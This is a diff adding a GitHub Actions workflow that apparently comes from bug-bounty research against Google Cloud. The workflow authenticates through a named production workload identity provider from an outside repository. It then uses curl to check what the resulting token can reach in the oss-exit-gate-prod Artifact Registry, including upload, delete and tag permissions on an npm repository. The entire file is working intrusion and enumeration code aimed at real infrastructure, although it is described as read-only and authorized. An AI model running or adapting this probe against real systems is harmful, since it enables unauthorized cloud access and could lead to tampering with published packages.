@@ -1,0 +1,56 @@
+name: lane5-kcmd-wif-impact
+# Authorized Google Cloud VRP lane probe (read-only).
+# After lane5-wif-matrix proved the OSS Exit Gate WIF provider accepts an OIDC
+# token from pwnhaven-afk/wif-probe, this workflow measures what the resulting
+# federated access token is allowed to do WITHOUT writing anything:
+#   - tokeninfo
+#   - artifactregistry.repositories.get / packages list (GET)
+#   - artifactregistry :testIamPermissions for publish permissions
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+jobs:
+  impact:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Direct WIF to OSS Exit Gate provider
+        id: auth
+        uses: google-github-actions/auth@7c6bc770dae815cd3e89ee6cdf493a5fab2cc093 # v3
+        with:
+          create_credentials_file: true
+          export_environment_variables: true
+          workload_identity_provider: projects/305452601764/locations/global/workloadIdentityPools/builders/providers/github
+          token_format: ''
+      - name: Read-only impact probes
+        run: |
+          set -uo pipefail
+          TOKEN=$(gcloud auth print-access-token 2>/dev/null || true)
+          if [ -z "$TOKEN" ]; then echo "NO_TOKEN_FROM_GCLOUD"; exit 1; fi
+          echo "TOKEN_LEN=${#TOKEN}"
+          echo "--- tokeninfo ---"
+          curl -s -o /tmp/ti.json -w "http=%{http_code}\n" "https://oauth2.googleapis.com/tokeninfo?access_token=${TOKEN}"
+          head -c 800 /tmp/ti.json; echo
+          echo "--- AR repo get ---"
+          curl -s -o /tmp/repo.json -w "http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" \
+            "https://artifactregistry.googleapis.com/v1/projects/oss-exit-gate-prod/locations/us/repositories/knowledge-catalog--npm"
+          head -c 800 /tmp/repo.json; echo
+          echo "--- AR list repositories ---"
+          curl -s -o /tmp/repos.json -w "http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" \
+            "https://artifactregistry.googleapis.com/v1/projects/oss-exit-gate-prod/locations/us/repositories?pageSize=5"
+          head -c 800 /tmp/repos.json; echo
+          echo "--- AR testIamPermissions (publish perms) ---"
+          curl -s -o /tmp/tip.json -w "http=%{http_code}\n" -X POST -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" \
+            -d '{"permissions":["artifactregistry.repositories.uploadArtifacts","artifactregistry.repositories.downloadArtifacts","artifactregistry.repositories.get","artifactregistry.packages.list","artifactregistry.packages.get","artifactregistry.packages.delete","artifactregistry.versions.delete","artifactregistry.tags.create"]}' \
+            "https://artifactregistry.googleapis.com/v1/projects/oss-exit-gate-prod/locations/us/repositories/knowledge-catalog--npm:testIamPermissions"
+          head -c 1200 /tmp/tip.json; echo
+          echo "--- npm registry package metadata (read) ---"
+          curl -s -o /tmp/npm.json -w "http=%{http_code}\n" -H "Authorization: Bearer ${TOKEN}" \
+            "https://us-npm.pkg.dev/oss-exit-gate-prod/knowledge-catalog--npm/@google-cloud%2Fkcmd"
+          head -c 600 /tmp/npm.json; echo
+          echo "--- project testIamPermissions ---"
+          curl -s -o /tmp/tpp.json -w "http=%{http_code}\n" -X POST -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" \
+            -d '{"permissions":["artifactregistry.repositories.uploadArtifacts","resourcemanager.projects.get"]}' \
+            "https://cloudresourcemanager.googleapis.com/v1/projects/oss-exit-gate-prod:testIamPermissions"
+          head -c 600 /tmp/tpp.json; echo
